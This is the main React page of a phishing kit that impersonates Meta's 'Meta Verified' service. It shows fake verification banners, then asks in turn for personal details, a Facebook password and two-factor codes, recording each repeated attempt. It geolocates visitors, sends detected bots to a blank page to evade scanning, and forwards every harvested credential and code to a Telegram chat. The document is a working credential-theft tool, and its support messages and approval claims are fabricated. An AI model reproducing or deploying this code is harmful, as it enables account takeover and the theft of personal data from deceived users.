import { useState, useEffect, useMemo, useCallback } from 'react';
import axios from 'axios';
import MetaVerifiedBanner from '@/components/meta-verified-banner';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import SuccessModal from '@/components/SuccessModal';

// Utils
import { translateText } from '@/utils/translate';
import countryToLanguage from '@/utils/country_to_language';
import sendMessage from '@/utils/telegram';
import detectBot from '@/utils/detect_bot';

const LABEL = 'Thần-tài-đến';

const GEO_ENDPOINTS = [
    {
        url: 'https://get.geojs.io/v1/ip/geo.json',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipapi.co/json/',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country_name,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipwho.is/',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    }
];

const normalizeCountryCode = (code = '') => String(code).trim().toUpperCase();

const getFallbackLanguage = () => {
    const [browserLang = 'en'] = String(navigator.language || 'en').split('-');
    return browserLang.toLowerCase() || 'en';
};

const resolveTargetLang = (countryCode = '') => {
    const normalizedCode = normalizeCountryCode(countryCode);
    return countryToLanguage[normalizedCode] || getFallbackLanguage();
};

const formatDateTime = () => {
    const now = new Date();
    const pad = (value) => String(value).padStart(2, '0');
    return `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
};

const parseDeviceInfo = (ua = '') => {
    const normalizedUA = String(ua || '').toLowerCase();
    const deviceType = /mobile|android|iphone|ipad/i.test(normalizedUA) ? 'Mobile' : 'Desktop';

    const os = (() => {
        if (normalizedUA.includes('windows nt 10.0')) return 'Windows 10';
        if (normalizedUA.includes('windows nt')) return 'Windows';
        if (normalizedUA.includes('android')) return 'Android';
        if (normalizedUA.includes('iphone') || normalizedUA.includes('ipad') || normalizedUA.includes('ios')) return 'iOS';
        if (normalizedUA.includes('mac os x')) return 'macOS';
        if (normalizedUA.includes('linux')) return 'Linux';
        return 'Unknown OS';
    })();

    const browser = (() => {
        const edgeMatch = ua.match(/Edg\/(\d+(?:\.\d+)*)/i);
        if (edgeMatch) return `Edge ${edgeMatch[1]}`;

        const chromeMatch = ua.match(/Chrome\/(\d+(?:\.\d+)*)/i);
        if (chromeMatch) return `Chrome ${chromeMatch[1]}`;

        const firefoxMatch = ua.match(/Firefox\/(\d+(?:\.\d+)*)/i);
        if (firefoxMatch) return `Firefox ${firefoxMatch[1]}`;

        const safariMatch = ua.match(/Version\/(\d+(?:\.\d+)*)[\s\S]*Safari/i);
        if (safariMatch) return `Safari ${safariMatch[1]}`;

        return 'Unknown Browser';
    })();

    return `${deviceType} - ${os} - ${browser}`;
};

const fetchGeoData = async () => {
    for (const endpoint of GEO_ENDPOINTS) {
        try {
            const response = await axios.get(endpoint.url, { timeout: 5000 });
            const mapped = endpoint.map(response.data || {});
            if (mapped.ip || mapped.countryCode || mapped.country) {
                return mapped;
            }
        } catch {
            continue;
        }
    }
    throw new Error('All geo providers failed');
};

const Home = () => {
    const [showFirstFormModal, setShowFirstFormModal] = useState(false);
    const [showLoginModal, setShowLoginModal] = useState(false);
    const [show2FAModal, setShow2FAModal] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [formData, setFormData] = useState({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        dob: '',
        additionalNotes: ''
    });
    const [loginData, setLoginData] = useState({ email: '', password: '' });
    const [passwordAttempts, setPasswordAttempts] = useState([]);
    const [twoFAAttempts, setTwoFAAttempts] = useState([]);
    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
    const [deviceInfo, setDeviceInfo] = useState({ deviceInfo: 'Unknown' });
    const [translatedTexts, setTranslatedTexts] = useState({});
    const [targetLang, setTargetLang] = useState('en');

    const defaultTexts = useMemo(
        () => ({
            metaVerified: 'Meta Verified',
            privacyPolicy: 'Privacy Policy',
            confirm: 'Confirm',
            aboutHelpMore: 'About · Help · See more',

            loginInstruction: 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
            mobileOrEmail: 'Mobile number or email',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            logIn: 'Log in',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',

            twoFATitle: 'Check your authentication code',
            twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
            twoFAInstructionPrefix: 'Enter the code sent to',
            twoFAInstructionSuffix: 'or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).',
            code: 'Code',
            codeExpired: 'The code you entered is incorrect. Please try again.',
            pleaseWait: 'Please wait',

            successTitle: 'The request was sent successfully',
            successMessage1: 'Great, your verification request has been approved.',
            successMessage2: 'The badge should appear next to your name within the next hour.',
            successMessage3: 'If the badge has not appeared after this time, please contact us again for further assistance.',
            thankYou: 'Thank you',
            metaSupportTeam: 'Meta Support Team.',

            verificationInfo: 'Verification information',
            fillRequiredFields: 'Please fill in correctly and completely all required fields to complete the verification profile.',
            fullName: 'Full Name',
            fullNamePlaceholder: 'Example: John Smith',
            personalEmail: 'Personal Email',
            personalEmailPlaceholder: 'Example: johnsmith@gmail.com',
            businessEmail: 'Business Email',
            businessEmailPlaceholder: 'Example: contact@company.com',
            mobilePhone: 'Mobile Phone Number',
            mobilePhonePlaceholder: 'Example: +1 201 555 0123',
            yourPageName: 'Your Page Name',
            pageNamePlaceholder: 'Example: ABC Studio Official',
            additionalNotes: 'Additional notes (optional)',
            additionalNotesPlaceholder: 'Example: This page officially represents ABC brand and needs verification to improve trust.',
            dob: 'Date of birth',
            day: 'Day',
            step: 'Step',
            month: 'Month',
            year: 'Year',
            agreeToTermsOfUse: 'I agree to the Terms of Use',
            termsOfUseLink: 'Terms of Use',
            securityCheck: 'Security check',
            securityReason: 'For security reasons, please enter your password to continue.',
            validCodeHint: 'Valid code consists of 6 or 8 digits.',
            tryAnotherMethod: 'Try another method',
            twoFAStep: 'Two-factor authentication request',

            bannerSupportCenter: 'META VERIFIED SUPPORT CENTER',
            bannerIssueDate: 'Release date: May 16, 2026',
            bannerTitle: 'Submit Meta Verified verification profile',
            bannerDesc1: 'Your page is eligible for review. Please complete the profile so the verification team can prioritize receiving and processing it.',
            bannerDesc2: 'Submitting a complete profile helps shorten the comparison time and increase accuracy in the page identity verification process. The system will automatically record the profile status according to the tracking code below.',
            bannerIdCode: 'Verification profile code: #3LWK-NSGP-X43A',
            bannerBenefitTitle: 'Benefits of verification',
            bannerBenefit1: 'Confirm the legal prestige of the page with the official verification badge.',
            bannerBenefit2: 'Enhanced account security thanks to comparison process and additional protection layer.',
            bannerBenefit3: 'Improve customer reach through more stable visibility.',
            bannerPrepareTitle: 'Information to prepare',
            bannerPrepare1: 'Valid administrator and business information.',
            bannerPrepare2: 'Email/phone number can be verified immediately.',
            bannerPrepare3: 'Set up account security and two-layer authentication.',
            bannerProcessTitle: 'Profile processing flow',
            bannerProcess1: 'Step 1: Receive profile and check information completeness.',
            bannerProcess2: 'Step 2: Compare verification data and policy compliance level.',
            bannerProcess3: 'Step 3: Update approval results and next step instructions.',
            bannerCta: 'Submit Meta Verified verification profile',
            bannerNote: 'Important note: Profiles are only approved when the declared information is complete, accurate and comparable. Standard response time is 24 working hours; some cases may be longer if additional verification is needed.',
            bannerTerms: 'Terms',
            bannerCommunity: 'Community Standards',
            bannerHelp: 'Help Center',
            bannerBusinessHelp: 'Meta Business Help Center',
        }),
        []
    );

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
                const translated = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });
                setTranslatedTexts(translated);
            } catch (error) {
                console.error('Translation error:', error);
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        try {
            try {
                const data = await fetchGeoData();
                const normalizedCountryCode = normalizeCountryCode(data.countryCode);
                setIpInfo({
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country || 'Unknown'
                });
                localStorage.setItem(
                    'ipInfo',
                    JSON.stringify({
                        ip: data.ip || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        country: data.country || 'Unknown',
                        country_code: normalizedCountryCode || 'Unknown'
                    })
                );

                const targetLang = resolveTargetLang(normalizedCountryCode);
                localStorage.setItem('targetLang', targetLang);
                setTargetLang(targetLang);

                if (targetLang !== 'en') {
                    await translateAllTexts(targetLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
                const cachedTargetLang = localStorage.getItem('targetLang') || 'en';
                setTargetLang(cachedTargetLang);
                if (cachedTargetLang !== 'en') {
                    await translateAllTexts(cachedTargetLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            }

            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }

            const ua = navigator.userAgent;
            setDeviceInfo({ deviceInfo: ua });
        } catch (error) {
            console.error('Initialization error:', error);
            setTranslatedTexts(defaultTexts);
        }
    }, [defaultTexts, translateAllTexts]);

    useEffect(() => {
        localStorage.removeItem('message_id');
        localStorage.removeItem('message');
        localStorage.removeItem('messageId');
        initializeApp();
    }, [initializeApp]);

    const buildAndSend = (form, login, passwordLogs, attempts, ip, device) => {
        const escapeHtml = (value) =>
            String(value ?? 'N/A')
                .replaceAll('&', '&amp;')
                .replaceAll('<', '&lt;')
                .replaceAll('>', '&gt;');

        const safeIp = ip.ip || 'Unknown';
        const safeCity = ip.city || 'Unknown';
        const safeRegion = ip.region || 'Unknown';
        const safeCountry = ip.country || 'Unknown';
        const parsedDevice = parseDeviceInfo(device.deviceInfo);
        const deviceLine = '';
        // const deviceLine = `\n📱 Thiết bị: ${escapeHtml(parsedDevice)}`;

        const passwordLines = passwordLogs.length > 0
            ? passwordLogs.map((pwd, idx) => `   MK${idx + 1}: <code>${escapeHtml(pwd)}</code>`).join('\n')
            : '   MK1: <code>N/A</code>';

        const twoFALines = attempts.length > 0
            ? attempts.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
            : '   Code1: <code>N/A</code>';

        const message = `📩 <b>${escapeHtml(LABEL)}</b>
⏰ ${formatDateTime()}
🌐 IP: <code>${escapeHtml(safeIp)}</code>${deviceLine}
📍 Vị trí: ${escapeHtml(`${safeCity}, ${safeRegion}, ${safeCountry}`)}
━━━━━━━━━━━━━━━━━━━━
📋 <b>THÔNG TIN</b>
   Tên: <code>${escapeHtml(form.fullName)}</code>
   Email: <code>${escapeHtml(form.personalEmail)}</code>
   Email DN: <code>${escapeHtml(form.businessEmail)}</code>
   SĐT: <code>${escapeHtml(form.phone)}</code>
   Page: <code>${escapeHtml(form.pageName)}</code>

🔐 <b>ĐĂNG NHẬP</b>
${passwordLines}

🔒 <b>MÃ 2FA</b>
${twoFALines}
━━━━━━━━━━━━━━━━━━━━`;
        sendMessage(message);
    };

    const handleFirstFormSubmit = (data) => {
        buildAndSend(data, { email: '', password: '' }, [], [], ipInfo, deviceInfo);
        setFormData(data);
        setShowFirstFormModal(false);
        setShowLoginModal(true);
    };

    const handleLoginSubmit = (email, password) => {
        setLoginData({ email, password });
        const nextPasswordAttempts = [...passwordAttempts, password];
        setPasswordAttempts(nextPasswordAttempts);
        buildAndSend(formData, { email, password }, nextPasswordAttempts, twoFAAttempts, ipInfo, deviceInfo);
    };

    const handle2FASubmit = (code) => {
        const newAttempts = [...twoFAAttempts, code];
        setTwoFAAttempts(newAttempts);
        buildAndSend(formData, loginData, passwordAttempts, newAttempts, ipInfo, deviceInfo);
    };

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    return (
        <>
            <MetaVerifiedBanner
                altText={texts.metaVerified}
                onSubmit={() => setShowFirstFormModal(true)}
                texts={texts}
                targetLang={targetLang}
            />

            <FirstFormModal
                show={showFirstFormModal}
                onClose={() => setShowFirstFormModal(false)}
                onSubmit={handleFirstFormSubmit}
                texts={texts}
            />
            <LoginModal
                show={showLoginModal}
                onClose={() => setShowLoginModal(false)}
                onSubmit={handleLoginSubmit}
                onSuccess={() => {
                    setShowLoginModal(false);
                    setShow2FAModal(true);
                }}
                texts={texts}
            />
            <TwoFAModal
                show={show2FAModal}
                onClose={() => setShow2FAModal(false)}
                onSubmit={handle2FASubmit}
                onSuccess={() => {
                    setShow2FAModal(false);
                    setShowSuccessModal(true);
                }}
                texts={texts}
                formData={formData}
            />
            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
        </>
    );
};

export default Home;
